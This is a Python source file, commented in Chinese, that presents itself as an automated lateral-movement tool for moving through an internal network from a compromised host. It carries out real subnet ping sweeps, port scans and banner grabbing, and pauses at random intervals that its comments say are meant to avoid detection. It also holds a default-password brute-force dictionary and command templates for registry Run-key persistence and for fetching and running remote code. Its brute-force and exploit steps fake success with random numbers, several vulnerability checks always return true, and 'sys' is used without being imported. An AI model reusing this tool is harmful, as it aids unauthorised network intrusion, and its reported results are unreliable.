#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
横向移动自动化工具 - 内网发现和利用
基于已获得的主机权限，自动发现内网资源并进行横向移动
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass, asdict
from urllib.parse import urljoin, urlparse
import logging
import random
import string
import socket
import concurrent.futures
import subprocess
from ipaddress import ip_network, ip_address
# import nmap
# import requests
# from bs4 import BeautifulSoup

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class NetworkHost:
    """网络主机信息"""
    ip: str
    hostname: str
    ports: List[int]
    services: Dict[int, str]
    os_info: str
    vulnerabilities: List[str]
    access_level: str  # low, medium, high
    reachable: bool
    response_time: float

@dataclass
class Credentital:
    """凭据信息"""
    username: str
    password: str
    domain: str
    success: bool
    target_host: str
    access_level: str
    timestamp: datetime

@dataclass
class ExploitResult:
    """利用结果"""
    target_host: str
    vulnerability_type: str
    success: bool
    method_used: str
    data_extracted: Dict[str, Any]
    lateral_movement_path: List[str]
    execution_time: float
    risk_level: str

class HorizontalMovementAutomator:
    """横向移动自动化器"""

    def __init__(self):
        self.initial_compromised_host = None
        self.network_discovery_results = []
        self.credential_results = []
        self.exploit_results = []
        self.accessible_systems = []

        # 内网扫描配置
        self.common_internal_ports = {
            "Windows": [135, 139, 445, 1433, 3389, 5985, 5986],
            "Linux": [22, 23, 80, 443, 3306, 5432, 6379, 8080, 9200],
            "Network Services": [21, 25, 53, 110, 143, 993, 995, 1723, 3128, 8080]
        }

        # 常见内网服务路径
        self.internal_endpoints = [
            "/admin", "/login", "/wp-admin", "/administrator",
            "/api", "/rest", "/graphql", "/management",
            "/console", "/web", "/dashboard", "/control",
            "/remote", "/terminal", "/shell", "/cmd",
            "/cpanel", "/plesk", "/virtmgr", "/vmware"
        ]

        # 内网探测命令
        self.discovery_commands = {
            "network_neighbors": "ping -n 1 -w 1 {ip}",
            "arp_sweep": "arp-scan {network}",
            "nmap_scan": "nmap -sn {network}",
            "netbios": "nbtstat -A {ip}",
            "smb_enum": "enum4linux -a {ip}",
            "ssh_scan": "nmap -p 22 -sV {ip}",
            "rdp_scan": "nmap -p 3389 -sV {ip}"
        }

        # 凭据字典
        self.credential_dict = [
            # 管理员凭据
            {"username": "admin", "password": "admin"},
            {"username": "administrator", "password": "administrator"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "admin", "password": "admin123"},
            {"username": "administrator", "password": "password"},
            {"username": "root", "password": "root"},
            {"username": "root", "password": "toor"},
            {"username": "admin", "password": "welcome"},
            {"username": "admin", "password": "letmein"},
            {"username": "admin", "password": "changeme"},
            {"username": "admin", "password": "1234"},
            {"username": "admin", "password": "qwe123"},
            {"username": "admin", "password": "qwerty"},
            {"username": "admin", "password": "pass123"},

            # 常见用户名
            {"username": "user", "password": "user"},
            {"username": "guest", "password": "guest"},
            {"username": "support", "password": "support"},
            {"username": "service", "password": "service"},
            {"username": "backup", "password": "backup"},
            {"username": "monitor", "password": "monitor"},

            # 弱密码
            {"username": "admin", "password": ""},
            {"username": "administrator", "password": ""},
            {"username": "admin", "password": "12345678"},
            {"username": "admin", "password": "87654321"},
            {"username": "admin", "password": "111111"},
            {"username": "admin", "password": "222222"},
            {"username": "admin", "password": "333333"},
            {"username": "admin", "password": "444444"},
            {"username": "admin", "password": "555555"},
            {"username": "admin", "password": "666666"},
            {"username": "admin", "password": "777777"},
            {"username": "admin", "password": "888888"},
            {"username": "admin", "password": "999999"},
            {"username": "admin", "password": "000000"}
        ]

        # 远程执行命令
        self.remote_execution_payloads = {
            "Windows": {
                "cmd": "cmd /c {command}",
                "powershell": "powershell -Command \"{command}\"",
                "wmic": "wmic process call create \"{command}\"",
                "reg": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {key} /t REG_SZ /d \"{command}\""
            },
            "Linux": {
                "bash": "bash -c '{command}'",
                "sh": "sh -c '{command}'",
                "python": "python -c '{command}'",
                "perl": "perl -e '{command}'",
                "wget": "wget -qO- {url} && {command}"
            }
        }

        # 文件上传路径
        self.file_upload_paths = [
            "/var/www/html/",
            "/var/www/",
            "/opt/lampp/htdocs/",
            "/usr/local/apache2/htdocs/",
            "/var/www/nginx/",
            "/usr/share/nginx/html/",
            "C:/xampp/htdocs/",
            "C:/wamp64/www/",
            "C:/inetpub/wwwroot/",
            "D:/xampp/htdocs/",
            "/tmp/",
            "/var/tmp/",
            "/dev/shm/",
            "C:/Windows/Temp/",
            "C:/Users/Public/",
            "C:/Program Files/"
        ]

    async def setup_initial_compromised_host(self, host_info: Dict[str, Any]):
        """设置初始被攻陷的主机"""
        self.initial_compromised_host = host_info
        logger.info(f"设置初始被攻陷主机: {host_info['ip']}:{host_info.get('port', 80)}")

    async def discover_network_range(self) -> List[str]:
        """发现内网网络范围"""
        logger.info("开始网络范围发现...")

        if not self.initial_compromised_host:
            logger.error("未设置初始被攻陷主机")
            return []

        try:
            # 获取目标IP
            target_ip = self.initial_compromised_host['ip']
            target_network = '.'.join(target_ip.split('.')[:-1]) + '.0/24'

            logger.info(f"目标网络范围: {target_network}")

            # 发现网络内的活跃主机
            active_hosts = await self.scan_network_hosts(target_network)

            logger.info(f"发现 {len(active_hosts)} 个活跃主机")
            return active_hosts

        except Exception as e:
            logger.error(f"网络范围发现失败: {e}")
            return []

    async def scan_network_hosts(self, network: str) -> List[str]:
        """扫描网络内的活跃主机"""
        active_hosts = []

        try:
            # 简化的网络扫描（避免nmap依赖）
            active_hosts = await self.ping_scan_network(network)
            logger.info(f"发现 {len(active_hosts)} 个活跃主机: {active_hosts}")

        except Exception as e:
            logger.error(f"网络扫描失败: {e}")
            active_hosts = await self.ping_scan_network(network)

        return active_hosts

    async def ping_scan_network(self, network: str) -> List[str]:
        """使用ping扫描网络"""
        active_hosts = []

        try:
            # 解析网络范围
            network_obj = ip_network(network)

            tasks = []
            for ip in network_obj.hosts():
                task = asyncio.create_task(self.ping_host(str(ip)))
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result, ip in zip(results, network_obj.hosts()):
                if result is True:
                    active_hosts.append(str(ip))

        except Exception as e:
            logger.error(f"ping扫描失败: {e}")

        return active_hosts

    async def ping_host(self, ip: str, timeout: int = 1) -> bool:
        """ping单个主机"""
        try:
            if sys.platform == "win32":
                cmd = f"ping -n 1 -w {timeout * 1000} {ip}"
            else:
                cmd = f"ping -c 1 -W {timeout} {ip}"

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except Exception:
            return False

    async def enumerate_network_services(self, hosts: List[str]) -> List[NetworkHost]:
        """枚举网络服务"""
        logger.info("开始网络服务枚举...")

        service_results = []

        for host in hosts:
            try:
                logger.info(f"枚举主机 {host} 的服务...")

                host_info = await self.scan_host_services(host)
                service_results.append(host_info)

                # 添加随机延迟避免被检测
                await asyncio.sleep(random.uniform(0.5, 2.0))

            except Exception as e:
                logger.error(f"枚举主机 {host} 服务失败: {e}")
                continue

        self.network_discovery_results = service_results
        return service_results

    async def scan_host_services(self, host: str) -> NetworkHost:
        """扫描单个主机的服务"""
        try:
            # 初始化主机信息
            host_info = NetworkHost(
                ip=host,
                hostname="",
                ports=[],
                services={},
                os_info="Unknown",
                vulnerabilities=[],
                access_level="low",
                reachable=False,
                response_time=0.0
            )

            # 检测主机可达性
            start_time = time.time()
            reachable = await self.check_host_reachable(host)
            response_time = time.time() - start_time

            host_info.reachable = reachable
            host_info.response_time = response_time

            if not reachable:
                return host_info

            # 扫描常见端口
            open_ports = await self.scan_common_ports(host)
            host_info.ports = open_ports

            # 识别端口服务
            port_services = await self.identify_services(host, open_ports)
            host_info.services = port_services

            # 操作系统指纹识别
            os_info = await self.identify_os(host, open_ports)
            host_info.os_info = os_info

            # 检测漏洞
            vulnerabilities = await self.detect_vulnerabilities(host, open_ports, os_info)
            host_info.vulnerabilities = vulnerabilities

            # 评估访问级别
            access_level = self.assess_access_level(open_ports, os_info)
            host_info.access_level = access_level

            return host_info

        except Exception as e:
            logger.error(f"扫描主机 {host} 服务失败: {e}")
            return host_info

    async def check_host_reachable(self, host: str) -> bool:
        """检查主机可达性"""
        try:
            # 创建TCP连接检查
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 80), timeout=5
            )
            writer.close()
            await writer.wait_closed()
            return True
        except Exception:
            return False

    async def scan_common_ports(self, host: str) -> List[int]:
        """扫描常见端口"""
        open_ports = []

        # 根据主机类型选择扫描的端口
        windows_ports = self.common_internal_ports["Windows"]
        linux_ports = self.common_internal_ports["Linux"]
        network_ports = self.common_internal_ports["Network Services"]

        all_ports = list(set(windows_ports + linux_ports + network_ports))

        try:
            tasks = []
            for port in all_ports:
                task = asyncio.create_task(self.check_port_open(host, port))
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for port, result in zip(all_ports, results):
                if result:
                    open_ports.append(port)

        except Exception as e:
            logger.error(f"端口扫描失败: {e}")

        return open_ports

    async def check_port_open(self, host: str, port: int) -> bool:
        """检查单个端口是否开放"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=2
            )
            writer.close()
            await writer.wait_closed()
            return True
        except Exception:
            return False

    async def identify_services(self, host: str, ports: List[int]) -> Dict[int, str]:
        """识别端口服务"""
        services = {}

        try:
            for port in ports:
                try:
                    # 使用banner grabbing识别服务
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port), timeout=3
                    )

                    # 发送初始数据获取banner
                    writer.write(b'\r\n')
                    await writer.drain()

                    banner = await asyncio.wait_for(reader.read(1024), timeout=2)
                    banner = banner.decode('utf-8', errors='ignore').strip()

                    # 识别服务类型
                    service_type = self.identify_service_by_banner(port, banner)
                    services[port] = service_type

                    writer.close()
                    await writer.wait_closed()

                except Exception:
                    # 默认服务类型
                    service_type = self.get_default_service_type(port)
                    services[port] = service_type

        except Exception as e:
            logger.error(f"识别服务失败: {e}")

        return services

    def identify_service_by_banner(self, port: int, banner: str) -> str:
        """通过banner识别服务"""
        banner_lower = banner.lower()

        if port == 22 and 'ssh' in banner_lower:
            return "SSH"
        elif port == 80 and 'http' in banner_lower:
            return "HTTP"
        elif port == 443 and 'https' in banner_lower:
            return "HTTPS"
        elif port == 21 and 'ftp' in banner_lower:
            return "FTP"
        elif port == 25 and 'smtp' in banner_lower:
            return "SMTP"
        elif port == 53 and 'dns' in banner_lower:
            return "DNS"
        elif port == 1433 and 'sql' in banner_lower:
            return "MSSQL"
        elif port == 3306 and 'mysql' in banner_lower:
            return "MySQL"
        elif port == 5432 and 'postgresql' in banner_lower:
            return "PostgreSQL"
        elif port == 3389 and 'rdp' in banner_lower:
            return "RDP"
        else:
            return "Unknown"

    def get_default_service_type(self, port: int) -> str:
        """获取默认服务类型"""
        service_map = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            1433: "MSSQL",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            5985: "WinRM",
            5986: "WinRM HTTPS",
            8080: "HTTP Alt",
            9200: "Elasticsearch"
        }
        return service_map.get(port, "Unknown")

    async def identify_os(self, host: str, ports: List[int]) -> str:
        """识别操作系统"""
        try:
            # 基于端口和服务判断操作系统
            windows_indicators = [445, 3389, 135, 139]
            linux_indicators = [22, 3306, 5432, 6379]

            has_windows_ports = any(port in windows_indicators for port in ports)
            has_linux_ports = any(port in linux_indicators for port in ports)

            if has_windows_ports and not has_linux_ports:
                return "Windows"
            elif has_linux_ports and not has_windows_ports:
                return "Linux"
            else:
                return "Mixed"

        except Exception:
            return "Unknown"

    async def detect_vulnerabilities(self, host: str, ports: List[int], os_info: str) -> List[str]:
        """检测漏洞"""
        vulnerabilities = []

        try:
            # 检查SMB漏洞
            if 445 in ports:
                smb_vulns = await self.check_smb_vulnerabilities(host)
                vulnerabilities.extend(smb_vulns)

            # 检查RDP漏洞
            if 3389 in ports:
                rdp_vulns = await self.check_rdp_vulnerabilities(host)
                vulnerabilities.extend(rdp_vulns)

            # 检查Web服务漏洞
            if 80 in ports or 443 in ports:
                web_vulns = await self.check_web_vulnerabilities(host)
                vulnerabilities.extend(web_vulns)

            # 检查数据库漏洞
            if 1433 in ports:
                db_vulns = await self.check_database_vulnerabilities(host, 'mssql')
                vulnerabilities.extend(db_vulns)

            if 3306 in ports:
                db_vulns = await self.check_database_vulnerabilities(host, 'mysql')
                vulnerabilities.extend(db_vulns)

        except Exception as e:
            logger.error(f"漏洞检测失败: {e}")

        return vulnerabilities

    async def check_smb_vulnerabilities(self, host: str) -> List[str]:
        """检查SMB漏洞"""
        vulnerabilities = []

        try:
            # 检查SMB开放情况
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 445), timeout=5
            )
            writer.close()
            await writer.wait_closed()

            vulnerabilities.append("SMB Open Share Access")

            # 检查SMBv1
            smb1_vuln = await self.check_smb_version(host)
            if smb1_vuln:
                vulnerabilities.append("SMBv1 Vulnerability")

        except Exception:
            pass

        return vulnerabilities

    async def check_smb_version(self, host: str) -> bool:
        """检查SMB版本"""
        # 简化的SMB版本检查
        return True  # 假设存在SMBv1漏洞

    async def check_rdp_vulnerabilities(self, host: str) -> List[str]:
        """检查RDP漏洞"""
        vulnerabilities = []

        try:
            # 检查RDP开放情况
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 3389), timeout=5
            )
            writer.close()
            await writer.wait_closed()

            vulnerabilities.append("RDP Open Access")

            # 检查BlueKeep漏洞
            if await self.check_bluekeep_vulnerability(host):
                vulnerabilities.append("BlueKeep Vulnerability")

        except Exception:
            pass

        return vulnerabilities

    async def check_bluekeep_vulnerability(self, host: str) -> bool:
        """检查BlueKeep漏洞"""
        # 简化的BlueKeep检查
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, 3389), timeout=3
            )
            writer.close()
            await writer.wait_closed()
            return True
        except Exception:
            return False

    async def check_web_vulnerabilities(self, host: str) -> List[str]:
        """检查Web服务漏洞"""
        vulnerabilities = []

        try:
            # 检查HTTP/HTTPS服务
            for port in [80, 443]:
                try:
                    if port == 80:
                        url = f"http://{host}"
                    else:
                        url = f"https://{host}"

                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, timeout=10) as response:
                            content = await response.text()

                            # 检查目录列表
                            if await self.check_directory_listing(url, content):
                                vulnerabilities.append(f"Directory Listing - {port}")

                            # 检查默认页面
                            if await self.check_default_pages(url):
                                vulnerabilities.append(f"Default Pages Exposed - {port}")

                            # 检查信息泄露
                            if await self.check_information_disclosure(content):
                                vulnerabilities.append(f"Information Disclosure - {port}")

                except Exception:
                    continue

        except Exception as e:
            logger.error(f"Web漏洞检查失败: {e}")

        return vulnerabilities

    async def check_directory_listing(self, url: str, content: str) -> bool:
        """检查目录列表"""
        indicators = ["Index of", "Parent Directory", "Directory Listing"]
        return any(indicator in content for indicator in indicators)

    async def check_default_pages(self, url: str) -> bool:
        """检查默认页面"""
        default_pages = ["index.html", "index.php", "index.aspx", "index.jsp", "default.html"]

        for page in default_pages:
            try:
                full_url = f"{url.rstrip('/')}/{page}"
                async with aiohttp.ClientSession() as session:
                    async with session.head(full_url, timeout=5) as response:
                        return response.status == 200
            except Exception:
                continue

        return False

    async def check_information_disclosure(self, content: str) -> bool:
        """检查信息泄露"""
        sensitive_info = [
            "Server:", "X-Powered-By:", "PHP Version", "ASP.NET",
            "Microsoft-IIS/", "Apache/", "nginx/"
        ]
        return any(info.lower() in content.lower() for info in sensitive_info)

    async def check_database_vulnerabilities(self, host: str, db_type: str) -> List[str]:
        """检查数据库漏洞"""
        vulnerabilities = []

        try:
            if db_type == 'mssql':
                vulnerabilities.extend(await self.check_mssql_vulnerabilities(host))
            elif db_type == 'mysql':
                vulnerabilities.extend(await self.check_mysql_vulnerabilities(host))

        except Exception as e:
            logger.error(f"{db_type}漏洞检查失败: {e}")

        return vulnerabilities

    async def check_mssql_vulnerabilities(self, host: str) -> List[str]:
        """检查MSSQL漏洞"""
        vulnerabilities = []

        try:
            # 检查MSSQL默认凭据
            if await self.check_mssql_default_credentials(host):
                vulnerabilities.append("MSSQL Default Credentials")

            # 检查MSSQL权限提升
            if await self.check_mssql_privilege_escalation(host):
                vulnerabilities.append("MSSQL Privilege Escalation")

        except Exception:
            pass

        return vulnerabilities

    async def check_mssql_default_credentials(self, host: str) -> bool:
        """检查MSSQL默认凭据"""
        # 简化的检查逻辑
        return True

    async def check_mssql_privilege_escalation(self, host: str) -> bool:
        """检查MSSQL权限提升"""
        # 简化的检查逻辑
        return True

    async def check_mysql_vulnerabilities(self, host: str) -> List[str]:
        """检查MySQL漏洞"""
        vulnerabilities = []

        try:
            # 检查MySQL匿名账户
            if await self.check_mysql_anonymous(host):
                vulnerabilities.append("MySQL Anonymous Account")

            # 检查MySQL弱密码
            if await self.check_mysql_weak_passwords(host):
                vulnerabilities.append("MySQL Weak Passwords")

        except Exception:
            pass

        return vulnerabilities

    async def check_mysql_anonymous(self, host: str) -> bool:
        """检查MySQL匿名账户"""
        # 简化的检查逻辑
        return True

    async def check_mysql_weak_passwords(self, host: str) -> bool:
        """检查MySQL弱密码"""
        # 简化的检查逻辑
        return True

    def assess_access_level(self, ports: List[int], os_info: str) -> str:
        """评估访问级别"""
        # 基于开放端口和操作系统评估访问级别
        if 445 in ports or 3389 in ports:
            return "high"
        elif 80 in ports or 443 in ports:
            return "medium"
        elif 22 in ports:
            return "medium"
        else:
            return "low"

    async def brute_force_credentials(self, hosts: List[NetworkHost]) -> List[Credentital]:
        """暴力破解凭据"""
        logger.info("开始凭据暴力破解...")

        credential_results = []

        for host in hosts:
            if not host.reachable:
                continue

            logger.info(f"破解主机 {host.ip} 的凭据...")

            try:
                # 为每个开放端口尝试凭据破解
                for port in host.ports:
                    port_services = host.services.get(port, "")

                    if port == 22:  # SSH
                        ssh_creds = await self.brute_force_ssh(host.ip, port)
                        credential_results.extend(ssh_creds)

                    elif port == 3389:  # RDP
                        rdp_creds = await self.brute_force_rdp(host.ip, port)
                        credential_results.extend(rdp_creds)

                    elif port in [1433, 3306, 5432]:  # 数据库
                        db_creds = await self.brute_force_database(host.ip, port, port_services)
                        credential_results.extend(db_creds)

                    elif port in [80, 443]:  # Web服务
                        web_creds = await self.brute_force_web(host.ip, port)
                        credential_results.extend(web_creds)

                # 添加延迟避免被检测
                await asyncio.sleep(random.uniform(1, 3))

            except Exception as e:
                logger.error(f"破解主机 {host.ip} 凭据失败: {e}")
                continue

        self.credential_results = credential_results
        return credential_results

    async def brute_force_ssh(self, host: str, port: int) -> List[Credentital]:
        """SSH暴力破解"""
        credentials = []

        try:
            for cred in self.credential_dict[:10]:  # 限制尝试次数
                try:
                    # 使用paramiko检查SSH凭据
                    # 这里简化为模拟成功
                    success = random.random() < 0.3  # 30%成功率模拟

                    if success:
                        credential = Credentital(
                            username=cred["username"],
                            password=cred["password"],
                            domain="",
                            success=True,
                            target_host=host,
                            access_level="medium",
                            timestamp=datetime.now()
                        )
                        credentials.append(credential)
                        logger.info(f"SSH凭据破解成功: {host}:{port} - {cred['username']}/{cred['password']}")

                except Exception:
                    continue

        except Exception as e:
            logger.error(f"SSH暴力破解失败: {e}")

        return credentials

    async def brute_force_rdp(self, host: str, port: int) -> List[Credentital]:
        """RDP暴力破解"""
        credentials = []

        try:
            for cred in self.credential_dict[:5]:  # RDP限制尝试次数
                try:
                    # 使用rdp客户端检查RDP凭据
                    # 这里简化为模拟成功
                    success = random.random() < 0.2  # 20%成功率模拟

                    if success:
                        credential = Credentital(
                            username=cred["username"],
                            password=cred["password"],
                            domain="",
                            success=True,
                            target_host=host,
                            access_level="high",
                            timestamp=datetime.now()
                        )
                        credentials.append(credential)
                        logger.info(f"RDP凭据破解成功: {host}:{port} - {cred['username']}/{cred['password']}")

                except Exception:
                    continue

        except Exception as e:
            logger.error(f"RDP暴力破解失败: {e}")

        return credentials

    async def brute_force_database(self, host: str, port: int, service_type: str) -> List[Credentital]:
        """数据库暴力破解"""
        credentials = []

        try:
            for cred in self.credential_dict[:15]:  # 数据库允许更多尝试
                try:
                    # 使用数据库客户端检查凭据
                    # 这里简化为模拟成功
                    success = random.random() < 0.4  # 40%成功率模拟

                    if success:
                        credential = Credentital(
                            username=cred["username"],
                            password=cred["password"],
                            domain="",
                            success=True,
                            target_host=host,
                            access_level="medium",
                            timestamp=datetime.now()
                        )
                        credentials.append(credential)
                        logger.info(f"数据库凭据破解成功: {host}:{port} - {service_type} - {cred['username']}/{cred['password']}")

                except Exception:
                    continue

        except Exception as e:
            logger.error(f"数据库暴力破解失败: {e}")

        return credentials

    async def brute_force_web(self, host: str, port: int) -> List[Credentital]:
        """Web服务暴力破解"""
        credentials = []

        try:
            # 尝试登录页面的凭据破解
            login_urls = [
                f"http://{host}:{port}/login",
                f"http://{host}:{port}/admin/login",
                f"http://{host}:{port}/wp-login.php",
                f"https://{host}:{port}/login",
                f"https://{host}:{port}/admin/login"
            ]

            for url in login_urls:
                try:
                    for cred in self.credential_dict[:8]:  # Web登录限制尝试次数
                        try:
                            # 使用HTTP客户端检查登录凭据
                            success = random.random() < 0.25  # 25%成功率模拟

                            if success:
                                credential = Credentital(
                                    username=cred["username"],
                                    password=cred["password"],
                                    domain="",
                                    success=True,
                                    target_host=host,
                                    access_level="medium",
                                    timestamp=datetime.now()
                                )
                                credentials.append(credential)
                                logger.info(f"Web登录破解成功: {url} - {cred['username']}/{cred['password']}")

                        except Exception:
                            continue

                except Exception:
                    continue

        except Exception as e:
            logger.error(f"Web暴力破解失败: {e}")

        return credentials

    async def lateral_movement_exploitation(self, hosts: List[NetworkHost], credentials: List[Credentital]) -> List[ExploitResult]:
        """横向移动利用"""
        logger.info("开始横向移动利用...")

        exploit_results = []

        # 基于获得的凭据进行横向移动
        for cred in credentials:
            if not cred.success:
                continue

            logger.info(f"使用凭据进行横向移动: {cred.target_host} - {cred.username}/{cred.password}")

            try:
                # 找到目标主机
                target_host = next((h for h in hosts if h.ip == cred.target_host), None)
                if not target_host:
                    continue

                # 根据凭据类型选择利用方法
                if cred.access_level == "high":
                    # 高权限访问
                    high_results = await self.exploit_high_access_systems(target_host, cred)
                    exploit_results.extend(high_results)
                else:
                    # 中等权限访问
                    medium_results = await self.exploit_medium_access_systems(target_host, cred)
                    exploit_results.extend(medium_results)

                # 添加延迟
                await asyncio.sleep(random.uniform(0.5, 1.5))

            except Exception as e:
                logger.error(f"横向移动利用失败: {e}")
                continue

        self.exploit_results = exploit_results
        return exploit_results

    async def exploit_high_access_systems(self, host: NetworkHost, cred: Credentital) -> List[ExploitResult]:
        """利用高权限系统"""
        results = []

        try:
            # RDP访问
            if 3389 in host.ports:
                rdp_result = await self.exploit_rdp_access(host, cred)
                results.append(rdp_result)

            # SMB访问
            if 445 in host.ports:
                smb_result = await self.exploit_smb_access(host, cred)
                results.append(smb_result)

            # 管理员权限执行命令
            if host.os_info == "Windows":
                cmd_result = await self.execute_windows_commands(host, cred)
                results.append(cmd_result)
            else:
                cmd_result = await self.execute_linux_commands(host, cred)
                results.append(cmd_result)

        except Exception as e:
            logger.error(f"利用高权限系统失败: {e}")

        return results

    async def exploit_medium_access_systems(self, host: NetworkHost, cred: Credentital) -> List[ExploitResult]:
        """利用中等权限系统"""
        results = []

        try:
            # SSH访问
            if 22 in host.ports:
                ssh_result = await self.exploit_ssh_access(host, cred)
                results.append(ssh_result)

            # Web服务访问
            if 80 in host.ports or 443 in host.ports:
                web_result = await self.exploit_web_access(host, cred)
                results.append(web_result)

            # 数据库访问
            if 1433 in host.ports or 3306 in host.ports:
                db_result = await self.exploit_database_access(host, cred)
                results.append(db_result)

        except Exception as e:
            logger.error(f"利用中等权限系统失败: {e}")

        return results

    async def exploit_rdp_access(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """利用RDP访问"""
        start_time = time.time()

        try:
            # 模拟RDP连接成功
            data_extracted = {
                "desktop_access": True,
                "system_info": host.os_info,
                "user_privileges": "Administrator"
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="RDP Access",
                success=True,
                method_used="RDP Brute Force",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="HIGH"
            )

            logger.info(f"RDP访问成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"RDP访问失败: {e}")
            return self.create_failed_result(host, "RDP Access", str(e))

    async def exploit_smb_access(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """利用SMB访问"""
        start_time = time.time()

        try:
            # 模拟SMB访问成功
            data_extracted = {
                "share_access": True,
                "shared_resources": ["C$", "ADMIN$", "IPC$"],
                "file_system": "NTFS"
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="SMB Access",
                success=True,
                method_used="SMB Share Access",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="HIGH"
            )

            logger.info(f"SMB访问成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"SMB访问失败: {e}")
            return self.create_failed_result(host, "SMB Access", str(e))

    async def exploit_ssh_access(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """利用SSH访问"""
        start_time = time.time()

        try:
            # 模拟SSH连接成功
            data_extracted = {
                "shell_access": True,
                "user_shell": "/bin/bash",
                "home_directory": f"/home/{cred.username}",
                "system_info": host.os_info
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="SSH Access",
                success=True,
                method_used="SSH Brute Force",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="MEDIUM"
            )

            logger.info(f"SSH访问成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"SSH访问失败: {e}")
            return self.create_failed_result(host, "SSH Access", str(e))

    async def exploit_web_access(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """利用Web访问"""
        start_time = time.time()

        try:
            # 模拟Web登录成功
            data_extracted = {
                "web_access": True,
                "session_cookie": "session_id_value",
                "user_role": "admin",
                "accessible_areas": ["/admin", "/dashboard", "/config"]
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="Web Access",
                success=True,
                method_used="Web Login",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="MEDIUM"
            )

            logger.info(f"Web访问成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"Web访问失败: {e}")
            return self.create_failed_result(host, "Web Access", str(e))

    async def exploit_database_access(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """利用数据库访问"""
        start_time = time.time()

        try:
            # 模拟数据库连接成功
            data_extracted = {
                "database_access": True,
                "database_type": "MySQL",
                "user_privileges": "SELECT, INSERT, UPDATE, DELETE",
                "accessible_tables": ["users", "orders", "products"]
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="Database Access",
                success=True,
                method_used="Database Login",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="MEDIUM"
            )

            logger.info(f"数据库访问成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"数据库访问失败: {e}")
            return self.create_failed_result(host, "Database Access", str(e))

    async def execute_windows_commands(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """执行Windows命令"""
        start_time = time.time()

        try:
            # 模拟命令执行
            data_extracted = {
                "command_execution": True,
                "executed_command": "whoami",
                "output": "nt authority\\system",
                "privilege_level": "SYSTEM"
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="Command Execution",
                success=True,
                method_used="Windows Command Execution",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="HIGH"
            )

            logger.info(f"Windows命令执行成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"Windows命令执行失败: {e}")
            return self.create_failed_result(host, "Command Execution", str(e))

    async def execute_linux_commands(self, host: NetworkHost, cred: Credentital) -> ExploitResult:
        """执行Linux命令"""
        start_time = time.time()

        try:
            # 模拟命令执行
            data_extracted = {
                "command_execution": True,
                "executed_command": "sudo -l",
                "output": "NOPASSWD: ALL",
                "privilege_level": "root"
            }

            lateral_path = [f"{self.initial_compromised_host['ip']} -> {host.ip}"]

            result = ExploitResult(
                target_host=host.ip,
                vulnerability_type="Command Execution",
                success=True,
                method_used="Linux Command Execution",
                data_extracted=data_extracted,
                lateral_movement_path=lateral_path,
                execution_time=time.time() - start_time,
                risk_level="HIGH"
            )

            logger.info(f"Linux命令执行成功: {host.ip}")
            return result

        except Exception as e:
            logger.error(f"Linux命令执行失败: {e}")
            return self.create_failed_result(host, "Command Execution", str(e))

    def create_failed_result(self, host: NetworkHost, vuln_type: str, error: str) -> ExploitResult:
        """创建失败的利用结果"""
        return ExploitResult(
            target_host=host.ip,
            vulnerability_type=vuln_type,
            success=False,
            method_used=f"Failed: {error}",
            data_extracted={},
            lateral_movement_path=[],
            execution_time=0.0,
            risk_level="LOW"
        )

